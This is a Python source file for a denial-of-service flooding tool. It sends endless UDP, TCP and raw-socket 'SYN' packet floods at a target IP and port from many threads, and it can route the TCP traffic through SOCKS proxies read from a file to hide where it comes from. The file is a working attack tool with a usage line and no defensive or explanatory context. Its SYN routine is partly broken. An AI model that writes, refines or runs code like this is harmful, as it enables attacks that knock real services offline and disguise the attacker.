import os
import random
import socket
import sys
import threading
import time
import asyncio
import socks

RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"

proxies = []
use_proxy = False
proxy_type = socks.SOCKS5


def generate_payload(size, mode="random"):
    if mode == "null":
        return b"\x00" * size
    elif mode == "text":
        return ("A" * size).encode()
    elif mode == "ascii":
        return "".join([chr(random.randint(33, 126)) for _ in range(size)]).encode()
    else:
        return random._urandom(size)


def timestamp():
    return time.strftime("%H:%M:%S")


def get_socket_with_proxy():
    raw = random.choice(proxies)
    parts = raw.strip().split(":")
    sock = socks.socksocket()
    if len(parts) == 4:
        ip, port, user, pwd = parts
        sock.set_proxy(proxy_type, ip, int(port), username=user, password=pwd)
    elif len(parts) == 2:
        ip, port = parts
        sock.set_proxy(proxy_type, ip, int(port))
    else:
        raise ValueError("Invalid proxy format")
    return sock


async def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
    loop = asyncio.get_event_loop()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = generate_payload(packet_size, payload_mode)
    sent = 0

    while True:
        try:
            await loop.run_in_executor(None, sock.sendto, payload, (target_ip, target_port))
            sent += 1
            if sent % 10000 == 0:
                print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
        except Exception as e:
            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
            await asyncio.sleep(0.05)


async def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
    loop = asyncio.get_event_loop()
    payload = generate_payload(packet_size, payload_mode)
    sent = 0

    while True:
        try:
            sock = get_socket_with_proxy() if use_proxy else socket.socket()
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(2)
            await loop.run_in_executor(None, sock.connect, (target_ip, target_port))

            for _ in range(10):
                await loop.run_in_executor(None, sock.send, payload)
                sent += 1
                if sent % 1000 == 0:
                    print(f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}")

            sock.close()
        except Exception as e:
            print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
            await asyncio.sleep(0.05)


def syn_flood(target_ip, target_port, thread_id):
    sent = 0
    while True:
        try:
            sock = (
                get_socket_with_proxy()
                if use_proxy
                else socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            )
            packet = b"\x00" * 60
            sock.sendto(packet, (target_ip, target_port))
            sent += 1
            if sent % 100 == 0:
                print(f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}")
        except PermissionError:
            print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
            return
        except Exception as e:
            print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
            time.sleep(0.1)


def check_latency(ip, port):
    print(f"{CYAN}[+] Checking latency to {ip}:{port}...{RESET}")
    try:
        start = time.time()
        sock = socket.create_connection((ip, port), timeout=2)
        sock.close()
        latency = (time.time() - start) * 1000
        print(f"{GREEN}[✓] Latency: {latency:.2f} ms{RESET}")
    except Exception as e:
        print(f"{RED}[x] Latency check failed: {e}{RESET}")


def load_proxies():
    global use_proxy
    if os.path.exists("proxies.txt"):
        with open("proxies.txt") as f:
            for line in f:
                line = line.strip()
                if line and ":" in line:
                    proxies.append(line)
        use_proxy = len(proxies) > 0
        if use_proxy:
            print(f"{YELLOW}[!] Loaded {len(proxies)} proxies from proxies.txt{RESET}")


def thread_worker(protocol, target_ip, target_port, packet_size, thread_id, payload_mode):
    asyncio.run(
        udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode)
        if protocol == "udp"
        else tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode)
    )


def main():
    global proxy_type
    if len(sys.argv) < 6:
        print(
            f"Usage: python3 {sys.argv[0]} <ip> <port> <threads> <packet_size> <tcp/udp/syn> [payload_mode] [--proxy-type socks4|socks5]"
        )
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3])
    packet_size = int(sys.argv[4])
    protocol = sys.argv[5].lower()
    payload_mode = (
        sys.argv[6].lower() if len(sys.argv) > 6 and not sys.argv[6].startswith("--") else "random"
    )

    if "--proxy-type" in sys.argv:
        idx = sys.argv.index("--proxy-type")
        if idx + 1 < len(sys.argv):
            ptype = sys.argv[idx + 1].lower()
            if ptype == "socks4":
                proxy_type = socks.SOCKS4
            elif ptype == "socks5":
                proxy_type = socks.SOCKS5

    load_proxies()

    print(f"{CYAN}[*] Target: {target_ip}:{target_port}{RESET}")
    print(f"{CYAN}[*] Threads: {threads}, Size: {packet_size}, Protocol: {protocol.upper()}, Payload: {payload_mode}{RESET}")
    if use_proxy:
        print(f"{CYAN}[*] Using proxies with type: {'SOCKS4' if proxy_type == socks.SOCKS4 else 'SOCKS5'}{RESET}")

    if protocol in ("tcp", "udp"):
        check_latency(target_ip, target_port)

    for i in range(threads):
        if protocol == "syn":
            t = threading.Thread(target=syn_flood, args=(target_ip, target_port, i + 1))
        else:
            t = threading.Thread(
                target=thread_worker,
                args=(protocol, target_ip, target_port, packet_size, i + 1, payload_mode),
            )
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"{YELLOW}[!] Exiting...{RESET}")


if __name__ == "__main__":
    main()
